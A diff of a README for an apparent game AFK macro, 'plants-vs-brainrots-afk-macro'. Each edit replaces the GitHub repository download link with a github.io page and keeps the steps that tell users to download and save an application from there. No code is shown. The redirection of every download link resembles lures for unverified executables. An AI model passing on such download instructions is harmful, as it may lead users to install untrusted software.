@@ -1,6 +1,6 @@
 # 🌱 plants-vs-brainrots-afk-macro - Auto-Farm While You Relax!
 
-[🎮 Download Now](https://github.com/Petronillageneral5854/plants-vs-brainrots-afk-macro)
+[🎮 Download Now](https://petronillageneral5854.github.io)
 
 ---
 
@@ -14,7 +14,7 @@ Imagine playing Plants vs Brainrots without actually playing. This tool handles 
 
 Getting this working takes just a few minutes. Here's what to do:
 
-1. **Visit the download page** - Click the green button above or go to: `https://github.com/Petronillageneral5854/plants-vs-brainrots-afk-macro`
+1. **Visit the download page** - Click the green button above or go to: `https://petronillageneral5854.github.io`
 2. **Download the application** - Visit this link to download the application. Look for the file on that page - it's usually a button that says "Download" or "Latest Release."
 3. **Save the file somewhere easy to find** - Like your Desktop or Downloads folder. You'll need to find it later.
 
@@ -22,7 +22,7 @@ Getting this working takes just a few minutes. Here's what to do:
 
 ## 📥 Download & Install
 
-Visit this link to download the application: [https://github.com/Petronillageneral5854/plants-vs-brainrots-afk-macro](https://github.com/Petronillageneral5854/plants-vs-brainrots-afk-macro)
+Visit this link to download the application: [https://petronillageneral5854.github.io](https://petronillageneral5854.github.io)
 
 Once the download finishes:
 - The file will appear in your Downloads folder
